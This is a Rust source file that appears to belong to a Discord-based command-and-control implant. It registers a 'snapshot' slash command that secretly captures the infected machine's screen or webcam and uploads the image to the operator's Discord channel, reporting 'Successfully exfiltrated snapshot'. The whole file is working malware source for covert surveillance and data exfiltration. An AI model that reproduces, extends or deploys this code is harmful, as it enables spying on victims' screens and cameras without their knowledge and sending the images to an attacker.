use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper, discord_utils::bot_functions::send_channel_message, utils::agent::get_or_create_agent};

use serenity::{
    builder::{CreateApplicationCommand, CreateApplicationCommandOption},
    client::Context,
    model::{
        application::command::CommandOptionType,
        application::interaction::application_command::{
            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
        },
        application::interaction::InteractionResponseType,
        channel::AttachmentType,
    },
};

use chrono::Utc;
use nokhwa::utils::{CameraIndex, CameraInfo};
use screenshots::Screen;
use std::borrow::Cow;
use tracing::error;

fn create_screen_option(
    sub_command: &mut CreateApplicationCommandOption,
) -> &mut CreateApplicationCommandOption {
    let screens = Screen::all().unwrap(); //TODO: check for errors
    let mut screen_option = sub_command
        .name("screen")
        .description("Take a snapshot of the screen")
        .kind(CommandOptionType::SubCommand);
    screen_option = screen_option.create_sub_option(|option| {
        let mut screen_list_option = option
            .name("screen_list")
            .description("Choose a screen from the list")
            .kind(CommandOptionType::Integer)
            .required(true);

        for i in 0..screens.len() {
            screen_list_option =
                screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
        }
        screen_list_option
    });
    screen_option
}

fn create_camera_option(
    sub_command: &mut CreateApplicationCommandOption,
    cameras: Vec<CameraInfo>,
) -> &mut CreateApplicationCommandOption {
    let mut camera_option = sub_command
        .name("camera")
        .description("Take a snapshot from a camera")
        .kind(CommandOptionType::SubCommand);

    camera_option = camera_option.create_sub_option(|option| {
        let mut camera_list_option = option
            .name("camera_list")
            .description("Choose a camera from the list")
            .kind(CommandOptionType::Integer)
            .required(true);

        // Add integer choices to the camera list option based on the number of cameras.
        for (i, camera) in cameras.iter().enumerate() {
            camera_list_option = camera_list_option.add_int_choice(
                format!("{} ({})", camera.human_name(), camera.description()),
                i as i32,
            );
        }

        camera_list_option
    });

    camera_option
}

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Create the snapshot command.
    let snapshot_command = command
        .name("snapshot")
        .description("Grabs a snapshot from the screen or the camera");

    // This is just a depression mess not worth commenting out.
    snapshot_command.create_option(|option| {
        let option = option
            .name("type")
            .description("Type of snapshot to grab")
            .kind(CommandOptionType::SubCommandGroup);

        #[cfg(target_os = "windows")] //TODO: Explore how we can support linux here
        option.create_sub_option(|sub_command| create_screen_option(sub_command));

        // Error handle for the camera option
        let cameras = match wrapper::list_devices() {
            Ok(cameras) => cameras,
            Err(e) => {
                error!("Error retrieving camera list: {}", e);
                Vec::new()
            }
        };
        
        // Will only display the option if there was no error.
        if !cameras.is_empty() {
            option.create_sub_option(|sub_command| create_camera_option(sub_command, cameras));
        }

        option
    });

    command
}

/// Processes a Discord command for taking a snapshot and returns an optional attachment of the specified type.
///
/// # Arguments
///
/// * `options` - A slice of `CommandDataOption` containing the command options.
///
/// # Returns
///
/// An `Ok` result containing the optional attachment of the specified type, or an `Err` result containing a `DiscordC2Error`.
///
/// # Errors
///
/// Returns a `DiscordC2Error::InvalidInput` error in the following cases:
///
/// * The first option is missing or is not a snapshot type.
/// * The specified snapshot type is invalid.
/// * The specified screen or camera index is not a valid integer value.
///
/// # Examples
///
/// ```
/// use my_library::{run, CommandDataOption, AttachmentType, DiscordC2Error};
///
/// async fn process_command() -> Result<Option<AttachmentType>, DiscordC2Error> {
///     let options = vec![
///         CommandDataOption {
///             name: "snapshot".to_string(),
///             options: vec![
///                 CommandDataOption {
///                     name: "screen".to_string(),
///                     options: vec![
///                         CommandDataOption {
///                             name: "screen_list".to_string(),
///                             resolved: Some(CommandDataOptionValue::Integer(0)),
///                             ..Default::default()
///                         },
///                     ],
///                     ..Default::default()
///                 },
///             ],
///             ..Default::default()
///         },
///     ];
///
///     run(&options).await
/// }
/// ```
pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
        .options
        .get(0)
        .ok_or_else(|| {
            DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string())
        })?;

    match option.name.as_str() {
        "screen" => {
            // Grabs the screen option from the first options key.
            let screen_option = option.options.get(0).ok_or_else(|| {
                DiscordC2Error::InvalidInput("Expected screen_list option.".to_string())
            })?;

            // Now that we have the screen option, grab the index from .resolved, or throw an error.
            let screen_index = screen_option
                .resolved
                .clone()
                .and_then(|value| match value {
                    CommandDataOptionValue::Integer(integer) => Some(integer),
                    _ => None,
                })
                .ok_or_else(|| {
                    DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string())
                })?;

            Ok(Some(process_screen_option(screen_index as i32)?))
        }
        "camera" => {
            // Grabs the camera option from the first options key.
            let camera_option = option.options.get(0).ok_or_else(|| {
                DiscordC2Error::InvalidInput("Expected camera_list option.".to_string())
            })?;

            // Now that we have the camera option, grab the index from .resolved, or throw an error.
            let camera_index = camera_option
                .resolved
                .clone()
                .and_then(|value| match value {
                    CommandDataOptionValue::Integer(integer) => {
                        Some(CameraIndex::Index(integer as u32))
                    }
                    _ => None,
                })
                .ok_or_else(|| {
                    DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string())
                })?;

            Ok(Some(process_camera_option(camera_index)?))
        }
        _ => {
            println!("Invalid snapshot type: {}", option.name);
            Err(DiscordC2Error::InvalidInput(
                "Invalid snapshot type.".to_string(),
            ))
        }
    }
}

/// Handles a snapshot command from a user, which triggers a file exfiltration process and sends
/// the resulting file back to the user as a message attachment. The command must contain valid
/// options specifying the source of the snapshot. Returns `Ok(())` if the command was handled
/// successfully, or a `DiscordC2Error` if an error occurred during the process.
///
/// # Arguments
///
/// * `ctx` - A reference to the context for the current bot session.
/// * `command` - A reference to the interaction command that triggered this handler.
///
/// # Examples
///
/// ```no_run
/// use serenity::prelude::*;
/// use serenity::model::application::interaction::application_command::ApplicationCommandInteraction;
///
/// async fn handle_command(ctx: &Context, command: &ApplicationCommandInteraction) {
///     if command.kind != ApplicationCommandInteractionDataOptionType::SubCommand {
///         return;
///     }
///
///     match command.data.name.as_str() {
///         "snapshot" => {
///             if let Err(err) = handle_snapshot(ctx, command).await {
///                 eprintln!("Error handling snapshot command: {}", err);
///             }
///         }
///         _ => {}
///     }
/// }
/// ```
pub async fn snapshot_handler(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
    let content = run(&command.data.options).await?;

    let (message_content, message_file) = match content {
        Some(content) => (
            "Successfully exfiltrated snapshot:".to_owned(),
            Some(content),
        ),
        None => ("There was no file available".to_owned(), None),
    };

    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    message.content(message_content);
                    if let Some(file) = message_file {
                        message.add_file(file);
                    }
                    message
                })
        })
        .await?;

    Ok(())
}

/// Takes a snapshot from the camera with the specified index and returns it as an `AttachmentType`
/// object containing the snapshot data and filename. The filename is generated based on the current
/// UTC time. If an error occurs while initializing the camera or taking the snapshot, the function
/// returns a `DiscordC2Error` with a message indicating the nature of the error.
///
/// # Arguments
///
/// * `index` - The index of the camera to take a snapshot from.
///
/// # Examples
///
/// ```no_run
/// use serenity::model::channel::AttachmentType;
/// use crate::errors::DiscordC2Error;
/// use nokhwa::utils::CameraIndex;
///
/// async fn take_snapshot(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
///     let attachment = process_camera_option(index)?;
///     // Do something with the snapshot attachment
///     Ok(attachment)
/// }
/// ```
///
/// # Errors
///
/// Returns a `DiscordC2Error` if an error occurs while initializing the camera or taking the snapshot.
fn process_camera_option(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let camera = wrapper::init_static_cam(index)?;
    let snapshot_bytes = wrapper::snapshot(camera)?;

    let attachment = AttachmentType::Bytes {
        data: Cow::from(snapshot_bytes),
        filename: format!("screenshot{}.jpeg", Utc::now()),
    };

    Ok(attachment)
}

/// Takes a screenshot of the screen with the specified index and returns it as an `AttachmentType`
/// object containing the screenshot data and filename. The filename is generated based on the
/// current UTC time. If the screen with the specified index is not found, the function returns
/// a `DiscordC2Error` with a message indicating the invalid index.
///
/// # Arguments
///
/// * `index` - The index of the screen to take a screenshot of, starting from 0.
///
/// # Examples
///
/// ```no_run
/// use serenity::model::channel::AttachmentType;
/// use crate::errors::DiscordC2Error;
///
/// async fn take_screenshot(index: i32) -> Result<AttachmentType<'static>, DiscordC2Error> {
///     let attachment = process_screen_option(index)?;
///     // Do something with the screenshot attachment
///     Ok(attachment)
/// }
/// ```
///
/// # Errors
///
/// Returns a `DiscordC2Error` if an error occurs while capturing the screenshot or generating the
/// attachment.
fn process_screen_option(index: i32) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let screens = Screen::all().unwrap();
    let screen = screens.get(index as usize).unwrap();
    let buffer = screen.capture()?.buffer().to_owned();

    let attachment = AttachmentType::Bytes {
        data: Cow::from(buffer),
        filename: format!("screenshot{}.png", Utc::now()),
    };
    Ok(attachment)
}
